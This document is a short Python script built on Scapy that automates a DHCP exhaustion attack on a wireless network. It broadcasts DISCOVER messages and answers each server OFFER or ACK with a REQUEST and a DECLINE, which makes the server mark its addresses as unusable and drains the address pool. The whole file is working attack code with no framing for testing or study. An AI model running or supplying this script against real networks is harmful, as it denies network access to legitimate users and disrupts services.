from scapy.all import *
MESSAGE_TYPE_OFFER = 2
MESSAGE_TYPE_REQUEST = 3
MESSAGE_TYPE_ACK = 5
MESSAGE_TYPE_NAK = 6
MESSAGE_TYPE_RELEASE = 7

conf.iface = "wlan0"
 
num_offers = 0;
num_acks = 0;
num_naks = 0;


def discover():
	mac = "78:e4:00:70:ae:86"
	chaddr = ''.join([chr(int(x,16)) for x in mac.split(':')])
	discover = (
	    Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")/
	    IP(src="0.0.0.0",dst="255.255.255.255")/
	    UDP(sport=68,dport=67)/
	    BOOTP(chaddr=chaddr,xid=random.randint(0, 0xFFFFFFFF))/
	    DHCP(options=[('message-type','discover'),('end')])
	    )

	print "Sending DHCP DISCOVER..."
	conf.iface = "wlan0"
	sendp(discover,verbose=0)
	conf.iface = "wlan0"

def parse(pkt):
	global num_offers
	global num_acks
	global num_naks
	if DHCP in pkt:
		mtype = pkt[DHCP].options[0][1]
		your_ipaddr = pkt[BOOTP].yiaddr
		client_mac = pkt.dst
		if mtype == MESSAGE_TYPE_OFFER:
			num_offers = num_offers + 1
			print '%s DHCP OFFER(transaction:%s): %s for %s from %s' % (num_offers,pkt[BOOTP].xid,your_ipaddr,client_mac,pkt[IP].src)
			request = (
				Ether(src=client_mac,dst="ff:ff:ff:ff:ff:ff")/
				IP(src="0.0.0.0",dst="255.255.255.255")/
				UDP(sport=68,dport=67)/
				BOOTP(chaddr=pkt[BOOTP].chaddr,xid=pkt[BOOTP].xid)/
				DHCP(options=[('message-type','request'),('requested_addr',your_ipaddr),('end')])
				)
			print "Sending DHCP REQUEST..."
			conf.iface = "wlan0"
			sendp(request,verbose=0)
			conf.iface = "wlan0"
			mac = "78:e4:00:70:ae:86"
			dec = (
	    		Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")/
	    		IP(src="0.0.0.0",dst="255.255.255.255")/
	    		UDP(sport=68,dport=67)/
	    		BOOTP(chaddr=pkt[BOOTP].chaddr,xid=pkt[BOOTP].xid,ciaddr=pkt[BOOTP].yiaddr)/
	    		DHCP(options=[('message-type','decline'),('requested_addr',pkt[BOOTP].yiaddr),('end')])
	    		)
			sendp(dec,verbose=0)
			print "Sending DHCP DECLINE..."
		elif mtype == MESSAGE_TYPE_ACK:
			num_acks = num_acks + 1
			print '%s DHCP ACK(transaction:%s): %s for %s from %s' % (num_acks,pkt[BOOTP].xid,your_ipaddr,client_mac,pkt[IP].src)
			mac = "78:e4:00:70:ae:86"
			dec = (
	    		Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")/
	    		IP(src="0.0.0.0",dst="255.255.255.255")/
	    		UDP(sport=68,dport=67)/
	    		BOOTP(chaddr=pkt[BOOTP].chaddr,xid=pkt[BOOTP].xid,ciaddr=pkt[BOOTP].yiaddr)/
	    		DHCP(options=[('message-type','decline'),('requested_addr',pkt[BOOTP].yiaddr),('end')])
	    		)
			sendp(dec,verbose=0)
			print "Sending DHCP DECLINE..."
	discover()

sniff(prn=parse, filter="udp and (port 68 or port 67)")